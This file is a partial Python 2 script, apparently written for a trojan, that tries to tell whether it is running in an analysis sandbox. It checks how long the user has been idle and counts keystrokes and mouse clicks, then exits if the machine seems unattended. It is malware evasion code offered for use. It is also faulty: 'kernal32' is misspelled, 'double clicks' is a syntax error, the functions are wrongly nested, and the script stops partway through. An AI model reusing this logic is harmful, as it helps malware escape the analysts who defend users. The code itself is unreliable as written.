# SANDBOX DETECTION
# Helps determine if your trojan is executing within a sandbox

import ctypes
import random
import time
import sys

user32    = ctypes.windll.user32
kernal32  = ctypes.windll.kernal32

keystrokes    = 0
mouse_clicks  = 0
double_clicks = 0

class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [('cbSize', ctypes.c_uint),
                ('dwTime', ctypes.c_ulong)]


    def get_last_input():
        # LASTINPUTINFO structure will hold the timestamp
        struct_lastinputinfo = LASTINPUTINFO()
        struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO)

        # get last input registered
        user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))

        # now determine how long the machine has been running
        run_time = kernal32.GetTickCount()

        elapsed = run_time - struct_lastinputinfo.dwTime

        print "[*] It's been %d milliseconds since the last input event." % elapsed

        return elapsed


    def get_key_press():
        global mouse_clicks
        global keystrokes

        for i in range(0, 0xff):
            if user32.GetAsyncKeyState(i) == -32767:

                # 0x1 is the code for a left mouse-click
                if i == 0x1:
                    mouse_clicks += 1
                    return time.time()
                elif i > 32 and i < 127:
                    keystrokes += 1

        return None


    def detect_sandbox():
        global mouse_clicks
        global keystrokes

        max_keystrokes         = random.randint(10, 25)
        max_mouse_clicks       = random.randint(5, 25)
        double clicks          = 0
        max_double_clicks      = 0
        double_click_threshold = 0.250 # in seconds
        first_double_click     = None

        average_mousetime      = 0
        max_input_threshold    = 30000 # in milliseconds

        previous_timestamp     = None
        detection_complete     = False

        last_input = get_last_input()

        # if we hit our threshold let's bail out
        if last_input >= max_input_threshold:
            sys.exit(0)
